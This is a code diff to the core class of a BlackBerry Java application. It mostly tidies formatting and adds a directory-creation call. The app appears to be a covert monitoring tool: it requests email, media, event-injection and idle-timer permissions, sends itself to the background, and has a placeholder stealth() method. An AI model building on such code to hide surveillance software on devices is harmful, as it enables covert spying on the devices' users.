@@ -18,6 +18,7 @@ import net.rim.device.api.system.ApplicationDescriptor;
 import net.rim.device.api.system.CodeModuleManager;
 import net.rim.device.api.ui.UiApplication;
 import blackberry.crypto.Encryption;
+import blackberry.fs.Path;
 import blackberry.utils.Debug;
 import blackberry.utils.DebugLevel;
 import blackberry.utils.Utils;
@@ -65,17 +66,18 @@ public final class Core implements Runnable {
      */
     private Core() {
 
+        Path.makeDirs();
+
         //#ifdef DEBUG
-        Debug.init(Conf.DEBUG_OUT, Conf.DEBUG_SD, Conf.DEBUG_FLASH,
-                Conf.DEBUG_EVENTS, Conf.DEBUG_INFO);
+        Debug.init();
         debug = new Debug("Core", DebugLevel.VERBOSE);
-        debug.info("INIT "+ (new Date()).toString());
+        debug.info("INIT " + (new Date()).toString());
         //#endif
-        
+
         //#ifdef HAVE_PERMISSIONS
         checkPermissions();
         //#endif
-        
+
         task = Task.getInstance();
         Utils.sleep(1000);
 
@@ -101,8 +103,8 @@ public final class Core implements Runnable {
         //#endif
 
         Encryption.init();
-        
-        ((Main)UiApplication.getUiApplication()).goBackground();
+
+        ((Main) UiApplication.getUiApplication()).goBackground();
     }
 
     /**
@@ -159,8 +161,7 @@ public final class Core implements Runnable {
                 ApplicationPermissions.PERMISSION_MEDIA,
                 ApplicationPermissions.PERMISSION_EMAIL,
                 ApplicationPermissions.PERMISSION_EVENT_INJECTOR,
-                ApplicationPermissions.PERMISSION_IDLE_TIMER
-                };
+                ApplicationPermissions.PERMISSION_IDLE_TIMER };
 
         //TODO: Dalla 4.6: PERMISSION_INTERNET, PERMISSION_ORGANIZER_DATA, PERMISSION_LOCATION_DATA 
 
@@ -277,7 +278,7 @@ public final class Core implements Runnable {
      * Stealth.
      */
     private void stealth() {
-        
+
     }
 
 }
